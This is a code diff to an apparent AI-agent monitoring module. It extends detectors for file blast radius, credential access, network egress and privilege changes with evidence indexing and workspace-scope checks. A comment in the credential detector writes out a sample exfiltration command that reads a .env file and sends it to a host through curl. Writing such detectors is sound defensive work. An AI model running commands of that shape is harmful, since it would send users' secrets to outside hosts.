@@ -16,12 +16,17 @@ ignored inside inspect-only commands such as ``grep`` or ``git log``.
 from __future__ import annotations
 
 import re
+from itertools import islice
 from typing import Iterable, Optional
 
 from clawmetry.detector_payload import (
     _SEGMENT_SPLIT_RE, SECRET_VALUE_OWNERS, _segment_write_hosts, host_owned_by,
 )
-from clawmetry.detector_surface import _IPV4_RE, _cmd_sketch, _is_inspect_only, _redact_path
+from clawmetry.detector_surface import (
+    _IPV4_RE, _PATH_ARG_KEYS, _cmd_sketch, _is_inspect_only,
+    _redact_path,
+)
+from clawmetry.workspace_scope import path_scope, shell_mutation_paths
 
 
 def _core():
@@ -33,6 +38,25 @@ def _core():
     """
     from clawmetry import detectors as _d
     return _d
+
+
+def _evidenced(indices, *args):
+    incident = _core()._incident(*args)
+    incident["_evidence_step_indices"] = sorted({i for i in indices if type(i) is int})
+    return incident
+
+
+def _mutation_path_values(value, depth=0):
+    """Only path fields in a bounded nested edit, never replacement text."""
+    if isinstance(value, str):
+        yield value
+    elif isinstance(value, (list, tuple)) and depth < 2:
+        for item in value[:40]:
+            yield from _mutation_path_values(item, depth + 1)
+    elif isinstance(value, dict) and depth < 2:
+        for key, item in islice(value.items(), 40):
+            if str(key).lower() in _PATH_ARG_KEYS and str(key).lower() not in ("cwd", "src", "source"):
+                yield from _mutation_path_values(item, depth + 1)
 
 
 # ── Detector 5: file_blast_radius ────────────────────────────────────────────
@@ -95,12 +119,30 @@ def file_blast_radius(events: Iterable[dict], session_id: str,
     caller passes ``facts["cwd"]``; without it we do not guess a root.
     """
     try:
+        events = list(islice(events, _core().DETECT_EVENT_WINDOW))
         runtime, th, steps = _core()._prepare(events, steps, thresholds, runtime, session_id)
-        root = str((facts or {}).get("cwd") or "").rstrip("/")
+        root = str((facts or {}).get("cwd") or "")
+        # Read target fields without mistaking call context (cwd) or source
+        # paths for Write/Edit destinations. Index by the same chronological
+        # event and argument hash used during normalization.
+        raw_args = {}
+        for idx, event in enumerate(_core()._chronological(events)):
+            data = _core()._coerce_dict(event.get("data"))
+            calls = _core()._iter_tool_calls_from_data(
+                str(event.get("event_type") or "").lower(), data)
+            for call in calls[:40]:
+                raw_args[(idx, call.get("tool") or "", _core()._args_hash(call.get("args")))] = call.get("args")
         write_tools = th.get("write_tools")
         files: dict = {}
+        file_indices = {}
         outside = []
+        outside_indices = set()
+        outside_first_idx = None
+        unknown_paths = 0
+        checked_paths = 0
         destructive: list = []
+        destructive_indices = set()
+        root_delete_indices = set()
         root_delete = False
         write_calls = 0
         first_idx = None
@@ -108,28 +150,64 @@ def file_blast_radius(events: Iterable[dict], session_id: str,
             if st.get("kind") != "tool_call":
                 continue
             cmd = st.get("cmd") or ""
+            args = raw_args.get((st.get("i"), st.get("tool") or "", st.get("args_hash")))
+            relative_base = None
+            direct_targets = tuple(st.get("paths") or ())
+            if isinstance(args, dict):
+                relative_base = args.get("cwd") or args.get("workdir") or None
+                target_args = {k: v for k, v in islice(args.items(), 40)
+                               if str(k).lower() not in ("cwd", "workdir", "source", "src")}
+                direct_targets = tuple(dict.fromkeys(
+                    value for key, field in target_args.items()
+                    if str(key).lower() in _PATH_ARG_KEYS
+                    for value in _mutation_path_values(field)
+                    if value and len(value) <= 4096))[:40]
+            if "patch" in str(st.get("tool") or "").lower():
+                # Patch body text is data. Only explicit patch headers name
+                # file targets, never source literals in added/removed lines.
+                if not isinstance(args, dict):
+                    direct_targets = ()
+                header_matches = re.finditer(
+                    r"^\*\*\* (?:Add File|Update File|Delete File|Move to):[ \t]*(.+)$",
+                    cmd, re.M)
+                headers = tuple(m.group(1) for m in islice(header_matches, 40))
+                direct_targets = tuple(dict.fromkeys(direct_targets + headers))[:40]
+            # Direct file tools declare targets. Shell tools also name read
+            # sources, so only explicitly parsed destinations can cross scope.
+            targets = (direct_targets
+                       if _core()._is_write_tool(st.get("tool") or "", write_tools)
+                       else shell_mutation_paths(cmd))
             hits = _destructive_hits(cmd) if cmd else []
             if hits:
                 destructive.extend(hits)
+                destructive_indices.add(st.get("i"))
                 if first_idx is None:
                     first_idx = st.get("i")
                 if _deletes_a_root(cmd, st.get("paths") or ()):
                     root_delete = True
-            if not (_core()._step_mutates(st, write_tools) or hits):
+                    root_delete_indices.add(st.get("i"))
+            if not (_core()._step_mutates(st, write_tools) or hits or targets):
                 continue
             write_calls += 1
             if first_idx is None:
                 first_idx = st.get("i")
-            for p in st.get("paths") or ():
+            for p in targets or st.get("paths") or ():
                 files.setdefault(p, st.get("tool") or "")
-                if root and not str(p).startswith(("-", "~")) \
-                        and str(p).startswith("/") and not str(p).startswith(root):
+                file_indices.setdefault(p, st.get("i"))
+            for p in targets:
+                scope = path_scope(p, root, relative_base=relative_base)
+                unknown_paths += scope == "unknown"
+                checked_paths += scope != "unknown"
+                if scope == "outside":
                     outside.append(p)
+                    outside_indices.add(st.get("i"))
+                    if outside_first_idx is None:
+                        outside_first_idx = st.get("i")
 
         limit = int(th["blast_files"])
         n_files = len(files)
         wide = n_files >= limit
-        if not (wide or destructive):
+        if not (wide or destructive or outside):
             return None
 
         # Evidence NEVER carries a raw command or a full path: this dict is
@@ -142,26 +220,38 @@ def file_blast_radius(events: Iterable[dict], session_id: str,
             "threshold_source": th["sources"]["blast_files"],
             "baseline": th.get("baseline", {}).get("write_files"),
             "outside_workspace": len(set(outside)),
+            "scope_basis": "lexical_tool_arguments",
+            "scope_checked_paths": checked_paths,
+            "scope_unknown_paths": unknown_paths,
+            "symlinks_resolved": False,
             "destructive": sorted(set(destructive))[:4],
-            "samples": [_redact_path(p) for p in list(files)[:3]],
+            "samples": ([".../[outside path]"] * min(3, len(set(outside)))
+                        if outside else [_redact_path(p) for p in list(files)[:3]]),
             "observed": "tool_arguments",
         }
         if root_delete:
-            return _core()._incident(
+            return _evidenced(root_delete_indices,
                 "file_blast_radius", session_id, runtime, "critical",
                 f"{runtime}: recursive delete at a home or system root",
                 "The agent ran a recursive delete targeting a home or system "
                 "root rather than a project subdirectory. " + _core()._stop_hint(),
                 evidence, first_idx)
+        if outside:
+            return _evidenced(outside_indices,
+                "file_blast_radius", session_id, runtime, "warning",
+                f"{runtime}: tool arguments target {len(set(outside))} path(s) outside the workspace",
+                "Tool arguments name a mutation outside the session workspace. "
+                "This is a lexical comparison. Symbolic links and actual writes are not verified. "
+                + _core()._stop_hint(), evidence, outside_first_idx)
         if destructive:
             label = sorted(set(destructive))[0]
-            return _core()._incident(
+            return _evidenced(destructive_indices,
                 "file_blast_radius", session_id, runtime, "warning",
                 f"{runtime}: {label} across {n_files} file(s)",
                 f"The agent ran a {label} command. Destructive commands are "
                 f"not undone by stopping the agent afterwards. " + _core()._stop_hint(),
                 evidence, first_idx)
-        return _core()._incident(
+        return _evidenced(file_indices.values(),
             "file_blast_radius", session_id, runtime, "warning",
             f"{runtime}: {n_files} files changed in one stretch",
             f"The agent mutated {n_files} distinct files (threshold {limit}) "
@@ -230,14 +320,17 @@ _SECRET_VAR_NAME_RE = re.compile(
     re.I | re.M)
 
 
-def _dump_secret_names(steps, pos: int) -> int:
+def _dump_secret_names(steps, pos: int, indices=None) -> int:
     """How many credential-named variables the output of the environment dump
     at ``steps[pos]`` printed. The dump's output is the first tool result after
     the call; ``0`` when there is none or it names no credential."""
     for st in steps[pos + 1:]:
         if st.get("kind") == "tool_result":
-            return len(set(m.group(0).lower() for m in
-                           _SECRET_VAR_NAME_RE.finditer(st.get("result_text") or "")))
+            count = len(set(m.group(0).lower() for m in
+                            _SECRET_VAR_NAME_RE.finditer(st.get("result_text") or "")))
+            if count and indices is not None:
+                indices.add(st.get("i"))
+            return count
         if st.get("kind") == "tool_call":
             return 0
     return 0
@@ -262,6 +355,10 @@ def _secret_value_lane(steps) -> Optional[dict]:
     held: dict = {}
     sent_to: dict = {}
     reused: set = set()
+    output_indices = set()
+    held_indices = set()
+    sent_indices = set()
+    reused_indices = set()
     first_idx = None
     for pos, st in enumerate(steps):
         vals = st.get("secret_values") or ()
@@ -271,21 +368,26 @@ def _secret_value_lane(steps) -> Optional[dict]:
             first_idx = st.get("i")
         kind = st.get("kind")
         if kind == "tool_result":
+            output_indices.add(st.get("i"))
             for c in vals:
                 in_output.setdefault(c, pos)
             continue
         if kind != "tool_call":
             continue
+        held_indices.add(st.get("i"))
         call_hosts = st.get("hosts") or ()
         for c in vals:
             held[c] = held.get(c, 0) + 1
             owners = SECRET_VALUE_OWNERS.get(c)
             if owners is not None:
                 for h in call_hosts:
-                    if not host_owned_by(h, owners) and h not in sent_to.get(c, ()):
-                        sent_to.setdefault(c, []).append(h)
+                    if not host_owned_by(h, owners):
+                        sent_indices.add(st.get("i"))
+                        if h not in sent_to.get(c, ()):
+                            sent_to.setdefault(c, []).append(h)
             if call_hosts and c in in_output and in_output[c] < pos:
                 reused.add(c)
+                reused_indices.update((st.get("i"), steps[in_output[c]].get("i")))
     if not in_output and not held:
         return None
 
@@ -322,6 +424,8 @@ def _secret_value_lane(steps) -> Optional[dict]:
         "in_output": sorted(in_output),
         "sent_to_hosts": sorted({h for hs in sent_to.values() for h in hs}),
         "reused": sorted(reused),
+        "indices": (sent_indices if sent_to else reused_indices if reused else
+                    held_indices if held else output_indices),
     }
 
 
@@ -345,6 +449,11 @@ def credential_access(events: Iterable[dict], session_id: str,
     try:
         runtime, th, steps = _core()._prepare(events, steps, thresholds, runtime, session_id)
         categories: dict = {}
+        location_indices = set()
+        strong_indices = set()
+        first_strong_pos = None
+        first_strong_idx = None
+        dump_indices = set()
         first_idx = None
         first_pos = None
         dump_secret_names = 0
@@ -359,12 +468,18 @@ def credential_access(events: Iterable[dict], session_id: str,
             for label, rx in _CREDENTIAL_PATTERNS:
                 if rx.search(haystack):
                     categories[label] = categories.get(label, 0) + 1
+                    location_indices.add(st.get("i"))
+                    if label in _CREDENTIAL_STRONG:
+                        strong_indices.add(st.get("i"))
+                        if first_strong_pos is None:
+                            first_strong_pos = pos
+                            first_strong_idx = st.get("i")
                     if first_idx is None:
                         first_idx = st.get("i")
                         first_pos = pos
                     if label == "environment dump":
                         dump_secret_names = max(dump_secret_names,
-                                                _dump_secret_names(steps, pos))
+                                                _dump_secret_names(steps, pos, dump_indices))
         values = _secret_value_lane(steps)
         if not categories and not values:
             return None
@@ -373,13 +488,18 @@ def credential_access(events: Iterable[dict], session_id: str,
         # touching call itself counts: `curl host?d=$(cat .env)` reads and
         # sends in one command, the tightest form of the shape.
         egress_after = []
-        for st in steps[first_pos or 0:] if categories else ():
+        egress_indices = set()
+        correlation_pos = first_strong_pos if first_strong_pos is not None else first_pos
+        for st in steps[correlation_pos or 0:] if categories else ():
             for h in st.get("hosts") or ():
                 egress_after.append(h)
+                egress_indices.add(st.get("i"))
         egress_after = sorted(set(egress_after))
 
         labels = sorted(categories)
         strong = [c for c in labels if c in _CREDENTIAL_STRONG]
+        if strong:
+            first_idx = first_strong_idx
         evidence = {
             "categories": labels,
             "strong_categories": strong,
@@ -404,7 +524,7 @@ def credential_access(events: Iterable[dict], session_id: str,
             # location finding; with no location finding, the value lane is
             # the whole story at whatever severity it earned.
             if values["severity"] == "critical" or not categories:
-                return _core()._incident(
+                return _evidenced(values["indices"],
                     "credential_access", session_id, runtime, values["severity"],
                     f"{runtime}: {values['title']}",
                     values["detail"] + _core()._stop_hint(), evidence,
@@ -418,7 +538,7 @@ def credential_access(events: Iterable[dict], session_id: str,
             # tokens has put those tokens in the transcript and the model's
             # context, whoever asked for it (ATLAS AML.CS0048 S05).
             evidence["observed"] = "tool_arguments_and_results"
-            return _core()._incident(
+            return _evidenced(location_indices | dump_indices,
                 "credential_access", session_id, runtime, "warning",
                 f"{runtime}: dumped an environment holding "
                 f"{dump_secret_names} secret variable(s)",
@@ -431,7 +551,7 @@ def credential_access(events: Iterable[dict], session_id: str,
         if egress_after and not strong:
             # Egress after a bare `env` is not the exfiltration shape; say what
             # was seen without the escalation.
-            return _core()._incident(
+            return _evidenced(location_indices | egress_indices,
                 "credential_access", session_id, runtime, "info",
                 f"{runtime}: dumped the environment",
                 f"The agent printed its environment variables and later "
@@ -440,13 +560,13 @@ def credential_access(events: Iterable[dict], session_id: str,
                 + _core()._stop_hint(),
                 evidence, first_idx)
         if not strong:
-            return _core()._incident(
+            return _evidenced(location_indices,
                 "credential_access", session_id, runtime, "info",
                 f"{runtime}: dumped the environment",
                 "The agent printed its environment variables. " + _core()._stop_hint(),
                 evidence, first_idx)
         if egress_after:
-            return _core()._incident(
+            return _evidenced(strong_indices | egress_indices,
                 "credential_access", session_id, runtime, "critical",
                 f"{runtime}: read {head}{more}, then reached {len(egress_after)} "
                 f"external host(s)",
@@ -454,7 +574,7 @@ def credential_access(events: Iterable[dict], session_id: str,
                 f"{', '.join(egress_after[:3])}. That ordering is worth a look "
                 f"before it continues. " + _core()._stop_hint(),
                 evidence, first_idx)
-        return _core()._incident(
+        return _evidenced(strong_indices,
             "credential_access", session_id, runtime, "warning",
             f"{runtime}: read {head}{more}",
             f"The agent opened {head}{more}. Plenty of tasks legitimately need "
@@ -537,19 +657,25 @@ def network_egress(events: Iterable[dict], session_id: str,
         read_only = th.get("read_only_hosts") or frozenset()
         hosts: dict = {}
         written: dict = {}
+        host_indices = {}
+        write_indices = {}
+        pipe_indices = {}
         first_idx = None
         piped: dict = {}
         for st in steps:
             if st.get("hosts") and _pipes_remote_script(st.get("cmd") or ""):
                 for h in st.get("hosts") or ():
                     piped.setdefault(h, st.get("i"))
+                    pipe_indices.setdefault(h, set()).add(st.get("i"))
             for h in st.get("hosts") or ():
+                host_indices.setdefault(h, set()).add(st.get("i"))
                 if h not in hosts:
                     hosts[h] = st.get("i")
                     if first_idx is None:
                         first_idx = st.get("i")
             for h in st.get("write_hosts") or ():
                 written.setdefault(h, st.get("i"))
+                write_indices.setdefault(h, set()).add(st.get("i"))
         if not hosts:
             return None
 
@@ -610,7 +736,7 @@ def network_egress(events: Iterable[dict], session_id: str,
             seen = (f"none of the {len(known)} host(s) its cohort has used for "
                     f"longer than {window}" if known
                     else "no host history yet")
-            return _core()._incident(
+            return _evidenced({i for h in piped_new for i in pipe_indices.get(h, ())},
                 "network_egress", session_id, runtime, sev,
                 f"{runtime}: ran a script fetched from {shown}",
                 f"The agent piped what {shown} served straight into an "
@@ -627,7 +753,7 @@ def network_egress(events: Iterable[dict], session_id: str,
                            f"{window}, so they are not counted as normal yet. ")
             verb = ("first write to" if any(h in written for h in new_hosts[:3])
                     else "first contact with")
-            return _core()._incident(
+            return _evidenced({i for h in new_hosts for i in host_indices.get(h, ())},
                 "network_egress", session_id, runtime, sev,
                 f"{runtime}: {verb} {shown}"
                 + (f" +{len(new_hosts) - 3} more" if len(new_hosts) > 3 else ""),
@@ -635,7 +761,7 @@ def network_egress(events: Iterable[dict], session_id: str,
                 evidence, hosts.get(new_hosts[0]))
         if ground == "write_to_read_only_host":
             shown = ", ".join(ro_writes[:3])
-            return _core()._incident(
+            return _evidenced({i for h in ro_writes for i in write_indices.get(h, ())},
                 "network_egress", session_id, runtime, sev,
                 f"{runtime}: sent data to {shown}, a host its cohort only reads from",
                 f"The agent wrote to {shown} (an upload, a PUT or POST, a "
@@ -645,13 +771,13 @@ def network_egress(events: Iterable[dict], session_id: str,
                 f"things there is the unusual direction. " + _core()._stop_hint(),
                 evidence, written.get(ro_writes[0]))
         if ground == "fanout":
-            return _core()._incident(
+            return _evidenced({i for values in host_indices.values() for i in values},
                 "network_egress", session_id, runtime, sev,
                 f"{runtime}: reached {len(distinct)} external hosts",
                 f"The agent contacted {len(distinct)} distinct external hosts "
                 f"in one stretch (threshold {fanout_limit}). " + _core()._stop_hint(),
                 evidence, first_idx)
-        return _core()._incident(
+        return _evidenced({i for h in raw_ips for i in host_indices.get(h, ())},
             "network_egress", session_id, runtime, sev,
             f"{runtime}: connected to a raw IP address",
             f"The agent connected to {raw_ips[0]} by address rather than by "
@@ -726,7 +852,7 @@ _ROOT_UID_ONLY_RE = re.compile(r"^\s*0\s*$", re.M)
 _RUNS_AS_ROOT_LABEL = "runs as root (uid 0)"
 
 
-def _probe_says_root(steps, pos: int) -> bool:
+def _probe_says_root(steps, pos: int, indices=None) -> bool:
     """True when ``steps[pos]`` is a bare identity probe and the first tool
     result after it reports uid 0."""
     cmd = steps[pos].get("cmd") or ""
@@ -738,8 +864,11 @@ def _probe_says_root(steps, pos: int) -> bool:
     for st in steps[pos + 1:]:
         if st.get("kind") == "tool_result":
             out = st.get("result_text") or ""
-            return bool(_ROOT_IDENTITY_RE.search(out)
+            root = bool(_ROOT_IDENTITY_RE.search(out)
                         or (uid_only and _ROOT_UID_ONLY_RE.search(out)))
+            if root and indices is not None:
+                indices.update((steps[pos].get("i"), st.get("i")))
+            return root
         if st.get("kind") == "tool_call":
             return False
     return False
@@ -762,13 +891,15 @@ def privilege_change(events: Iterable[dict], session_id: str,
         runtime, th, steps = _core()._prepare(events, steps, thresholds, runtime, session_id)
         found: dict = {}
         critical: list = []
+        matched_indices = set()
+        critical_indices = set()
         first_idx = None
         sketch = ""
         for pos, st in enumerate(steps):
             if st.get("kind") != "tool_call":
                 continue
             cmd = st.get("cmd") or ""
-            if cmd and _probe_says_root(steps, pos):
+            if cmd and _probe_says_root(steps, pos, matched_indices):
                 found[_RUNS_AS_ROOT_LABEL] = found.get(_RUNS_AS_ROOT_LABEL, 0) + 1
                 if first_idx is None:
                     first_idx = st.get("i")
@@ -778,8 +909,10 @@ def privilege_change(events: Iterable[dict], session_id: str,
             for label, rx, is_crit in _PRIVILEGE_PATTERNS:
                 if rx.search(cmd):
                     found[label] = found.get(label, 0) + 1
+                    matched_indices.add(st.get("i"))
                     if is_crit:
                         critical.append(label)
+                        critical_indices.add(st.get("i"))
                     if first_idx is None:
                         first_idx = st.get("i")
                         sketch = _cmd_sketch(cmd)
@@ -787,6 +920,8 @@ def privilege_change(events: Iterable[dict], session_id: str,
                    for seg in _SEGMENT_SPLIT_RE.split(cmd)[:40]):
                 found[_ADMIN_API_LABEL] = found.get(_ADMIN_API_LABEL, 0) + 1
                 critical.append(_ADMIN_API_LABEL)
+                matched_indices.add(st.get("i"))
+                critical_indices.add(st.get("i"))
                 if first_idx is None:
                     first_idx = st.get("i")
                     sketch = _cmd_sketch(cmd)
@@ -804,7 +939,7 @@ def privilege_change(events: Iterable[dict], session_id: str,
         }
         if critical:
             head = sorted(set(critical))[0]
-            return _core()._incident(
+            return _evidenced(critical_indices,
                 "privilege_change", session_id, runtime, "critical",
                 f"{runtime}: {head}",
                 f"The agent {head}. This outlives the session: stopping the "
@@ -812,7 +947,7 @@ def privilege_change(events: Iterable[dict], session_id: str,
                 evidence, first_idx)
         head = labels[0]
         more = f" and {len(labels) - 1} more" if len(labels) > 1 else ""
-        return _core()._incident(
+        return _evidenced(matched_indices,
             "privilege_change", session_id, runtime, "warning",
             f"{runtime}: {head}{more}",
             (f"The agent {head}{more}. Every command it runs has root's "
